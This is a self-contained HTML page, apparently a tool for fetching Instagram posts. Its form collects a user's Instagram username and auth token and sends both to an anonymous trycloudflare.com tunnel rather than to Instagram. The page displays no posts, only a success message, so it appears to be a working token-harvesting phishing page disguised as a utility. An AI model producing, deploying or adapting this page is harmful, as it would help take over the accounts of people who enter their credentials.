
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Posts</title>

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    background: #0f1115;
    color: #e8e8ea;
    padding: 16px;
}

.card {
    width: 100%;
    max-width: 400px;
    background: #181b21;
    border: 1px solid #2a2e37;
    border-radius: 16px;
    padding: 32px 28px;
}

h1 {
    font-size: 22px;
    margin-bottom: 6px;
}

p.sub {
    font-size: 14px;
    color: #9aa0ab;
    margin-bottom: 24px;
}

label {
    display: block;
    font-size: 13px;
    color: #9aa0ab;
    margin-bottom: 6px;
}

input {
    width: 100%;
    padding: 11px 12px;
    background: #0f1115;
    border: 1px solid #2a2e37;
    border-radius: 8px;
    color: inherit;
    font-size: 14px;
    margin-bottom: 18px;
}

input:focus {
    outline: none;
    border-color: #c13584;
}

button {
    width: 100%;
    padding: 12px;
    border: none;
    border-radius: 8px;
    font-size: 15px;
    font-weight: 600;
    color: #fff;
    cursor: pointer;
    background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
    transition: opacity .15s;
}

button:disabled {
    opacity: .6;
    cursor: not-allowed;
}

#msg {
    margin-top: 16px;
    font-size: 13px;
    min-height: 18px;
    white-space: pre-wrap;
    overflow-wrap: anywhere;
}

#msg.error {
    color: #ff6b6b;
}

#msg.ok {
    color: #6bd68a;
}

</style>
</head>

<body>

<div class="card">

    <h1>Instagram Posts</h1>

    <p class="sub">
        Enter your Instagram username and authentication token.
    </p>

    <label for="username">Instagram Username</label>
    <input
        id="username"
        type="text"
        placeholder="Enter Instagram username"
        autocomplete="off"
    >

    <label for="authToken">Auth Token</label>
    <input
        id="authToken"
        type="password"
        placeholder="Enter your auth token"
        autocomplete="off"
    >

    <button id="btn">Get Instagram Posts</button>

    <div id="msg"></div>

</div>

<script>

const API_URL =
    "https://rental-background-painted-governmental.trycloudflare.com/instagram/posts/";
const usernameInput = document.getElementById("username");
const authTokenInput = document.getElementById("authToken");
const btn = document.getElementById("btn");
const msg = document.getElementById("msg");

function setMsg(text, type = "") {
    msg.textContent = text;
    msg.className = type;
}

btn.addEventListener("click", async () => {

    const username = usernameInput.value.trim();
    const authToken = authTokenInput.value.trim();

    if (!username) {
        return setMsg("Please enter an Instagram username.", "error");
    }

    if (!authToken) {
        return setMsg("Please enter your auth token.", "error");
    }

    btn.disabled = true;
    setMsg("Fetching Instagram posts...");

    try {

        const res = await fetch(API_URL, {
            method: "POST",
            credentials: "include",
            headers: {
                "Content-Type": "application/json","Request-ID": crypto.randomUUID()
            },
            body: JSON.stringify({
                username: username,
                token: authToken
            })
        });

        const data = await res.json();

        console.log("API Response:", data);

        if (!res.ok) {
            throw new Error(
                data.reason || `HTTP Error: ${res.status}`
            );
        }

        setMsg("Successfully fetched Instagram posts!", "ok");

        console.log("Instagram Posts:", data);

    } catch (err) {

        console.error("Error:", err);

        setMsg("Request failed: " + err.message, "error");

    } finally {
        btn.disabled = false;
    }

});

</script>

</body>
</html>
